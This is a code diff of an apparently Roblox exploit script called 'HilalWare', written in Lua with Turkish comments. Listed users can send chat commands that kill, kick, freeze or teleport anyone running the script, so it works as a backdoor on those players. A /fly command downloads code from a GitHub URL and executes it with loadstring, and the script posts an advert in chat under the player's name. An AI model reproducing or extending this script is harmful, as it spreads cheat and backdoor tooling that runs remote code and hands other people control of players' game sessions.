@@ -10,8 +10,8 @@ local allowedUsers = {
 }
 
 local frozen = false
-local loopBringTargets = {} -- [adminName] = connection
-local firstMessageSent = false -- sadece 1 kez mesaj göndermek için
+local loopBringTargets = {}
+local firstMessageSent = false
 
 -- Yönetici etiketi
 local function addAdminTag(player)
@@ -43,7 +43,6 @@ local function addAdminTag(player)
     end
 end
 
--- Karakterin tüm parçalarını dondur / çöz
 local function setAnchoredAllParts(char, anchored)
     for _, part in ipairs(char:GetDescendants()) do
         if part:IsA("BasePart") then
@@ -52,7 +51,6 @@ local function setAnchoredAllParts(char, anchored)
     end
 end
 
--- Chat mesajı gönder (ilk seferde reklam)
 local function sendFirstMessage()
     if not firstMessageSent then
         game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("By HilalWare.Lua New Scripts", "All")
@@ -64,13 +62,12 @@ local function sendChatMessage(msg)
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 
--- Oyuncu bul (isim duyarsız)
-local function findPlayerByName(name)
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if string.lower(plr.Name) == string.lower(name) then
-            return plr
-        end
+-- Kısmi isim eşleşmesi
+local function isTargetPlayer(targetText)
+    if not targetText then
+        return true -- isim yazılmazsa kendini hedef al
     end
+    return string.find(string.lower(LocalPlayer.Name), string.lower(targetText)) ~= nil
 end
 
 -- Komutlar
@@ -78,66 +75,57 @@ local function setupCommands(adminPlayer)
     adminPlayer.Chatted:Connect(function(message)
         local args = string.split(message, " ")
         local cmd = string.lower(args[1])
-        local targetName = args[2]
-        local targetPlayer = LocalPlayer -- varsayılan hedef
-
-        if targetName then
-            local found = findPlayerByName(targetName)
-            if found then
-                targetPlayer = found
-            else
-                return -- isim yanlışsa çalıştırma
-            end
-        end
+        local targetText = args[2]
 
         if not allowedUsers[adminPlayer.Name] then
             return
         end
 
-        sendFirstMessage() -- tüm komutlardan önce sadece 1 kez yazdırır
+        -- isim eşleşmiyorsa çık
+        if targetText and not isTargetPlayer(targetText) then
+            return
+        end
+
+        sendFirstMessage()
 
         if cmd == "/kill" then
-            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
-                targetPlayer.Character.Humanoid.Health = 0
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
             end
 
         elseif cmd == "/kick" then
-            if targetPlayer == LocalPlayer then
-                LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
-            end
+            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
 
         elseif cmd == "/freeze" then
-            if targetPlayer.Character then
-                setAnchoredAllParts(targetPlayer.Character, true)
+            if LocalPlayer.Character then
+                setAnchoredAllParts(LocalPlayer.Character, true)
             end
 
         elseif cmd == "/unfreeze" then
-            if targetPlayer.Character then
-                setAnchoredAllParts(targetPlayer.Character, false)
+            if LocalPlayer.Character then
+                setAnchoredAllParts(LocalPlayer.Character, false)
             end
 
         elseif cmd == "/bring" then
-            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") 
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
                 and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                LocalPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
             end
 
         elseif cmd == "/fly" then
-            if targetPlayer == LocalPlayer then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
-            end
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
 
         elseif cmd == "/unfly" then
-            if targetPlayer == LocalPlayer and _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
+            if _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
                 _G.FlyFunction(false)
             end
 
         elseif cmd == "/loopbring" then
-            if targetPlayer and not loopBringTargets[adminPlayer.Name] then
+            if not loopBringTargets[adminPlayer.Name] then
                 loopBringTargets[adminPlayer.Name] = game:GetService("RunService").Heartbeat:Connect(function()
-                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") 
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
                         and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                        targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                     end
                 end)
             end
@@ -149,9 +137,7 @@ local function setupCommands(adminPlayer)
             end
 
         elseif cmd == "/selam" then
-            if targetPlayer == LocalPlayer then
-                sendChatMessage("Alekümesselam")
-            end
+            sendChatMessage("Alekümesselam")
         end
     end)
 end
